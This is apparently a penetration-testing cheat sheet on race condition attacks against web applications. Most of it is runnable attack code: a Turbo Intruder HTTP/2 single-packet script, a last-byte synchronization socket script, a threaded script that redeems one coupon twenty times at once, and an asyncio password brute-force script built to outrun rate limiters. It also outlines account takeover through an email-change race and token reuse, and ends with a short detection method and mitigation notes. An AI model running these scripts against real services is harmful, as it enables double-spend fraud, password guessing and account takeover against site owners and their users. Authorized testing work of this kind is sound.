# Race Condition Exploitation

## HTTP/2 Single-Packet Attack (Modern Technique)

```python
# Send multiple requests in a single TCP packet → arrive simultaneously
# Eliminates network jitter → sub-millisecond precision
# Reference: James Kettle, "Smashing the state machine" (2023)

# Turbo Intruder (Burp Suite extension)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.HTTP2)

    # Queue all requests, then send in single packet
    for i in range(20):
        engine.queue(target.req, gate='race')

    engine.openGate('race')  # sends all at once

def handleResponse(req, interesting):
    table.add(req)
```

## Last-Byte Synchronization (HTTP/1.1)

```python
# Send all but last byte of each request
# Then send all last bytes simultaneously
# Works on HTTP/1.1 (no HTTP/2 required)

import socket, ssl, threading

def last_byte_sync(host, port, requests):
    socks = []
    for req in requests:
        s = socket.socket()
        s = ssl.wrap_socket(s)
        s.connect((host, port))
        s.send(req[:-1])  # send all but last byte
        socks.append((s, req[-1:]))

    # Synchronize: send last bytes simultaneously
    for s, last in socks:
        s.send(last)

    # Read responses
    for s, _ in socks:
        print(s.recv(4096).decode())
```

## Common Race Condition Patterns

### Double Spend / Coupon Reuse
```python
import requests, threading

URL = "http://TARGET/api/redeem"
TOKEN = "session_token"
COUPON = "SAVE50"

def redeem():
    r = requests.post(URL, cookies={"session": TOKEN},
                      json={"code": COUPON})
    print(f"Status: {r.status_code}, Response: {r.text[:100]}")

# Send 20 simultaneous requests
threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### TOCTOU (Time-of-Check-Time-of-Use)
```python
# Example: file upload check vs processing
# 1. Upload valid file → passes validation
# 2. Immediately replace with malicious file before processing

# Example: balance check vs deduction
# 1. Thread A: check balance ($100) → OK
# 2. Thread B: check balance ($100) → OK
# 3. Thread A: deduct $100 → balance = $0
# 4. Thread B: deduct $100 → balance = -$100 (double spend!)
```

### Rate Limit Bypass
```python
# Send requests faster than rate limiter can process
# Especially effective with HTTP/2 single-packet

import asyncio, aiohttp

async def brute(session, password):
    async with session.post(URL, json={"pass": password}) as r:
        return password, r.status

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [brute(session, p) for p in passwords[:100]]
        results = await asyncio.gather(*tasks)
        for pw, status in results:
            if status == 200:
                print(f"[+] Found: {pw}")

asyncio.run(main())
```

### Account Takeover via Email Verification
```python
# Race between:
# 1. Change email to attacker@evil.com
# 2. Request password reset (sent to original email)
# If reset token generated BEFORE email update processes:
# → Reset link goes to original email but resets password for new email
```

### Token/Nonce Reuse
```python
# If server generates token and checks usage in separate operations:
# Race: use same token multiple times before first use marks it as consumed
# Apply to: password reset tokens, CSRF tokens, OTP codes
```

## Detection Methodology

```
1. Identify state-changing operations:
   - Financial (transfer, purchase, redeem)
   - Authentication (login, password reset, email change)
   - Authorization (invite, role change)
   - Resource creation (account, file, record)

2. Test for race windows:
   - Send 10-20 identical requests simultaneously
   - Check: did the operation execute multiple times?
   - Check: was a limited resource consumed multiple times?

3. Tools:
   - Turbo Intruder (Burp) — HTTP/2 single-packet
   - Python threading/asyncio — custom race scripts
   - curl --parallel — simple parallel requests

4. Indicators of success:
   - Balance decreased more than expected
   - Coupon applied multiple times
   - Multiple rewards/records created
   - Rate limit bypassed
```

## Mitigation Awareness

```
# What makes race conditions hard to prevent:
# - Database transactions must be SERIALIZABLE (most use READ COMMITTED)
# - Row-level locks needed for financial operations
# - Distributed systems can't lock across services
# - Redis SETNX / database advisory locks for idempotency
# - Request deduplication by idempotency key
```
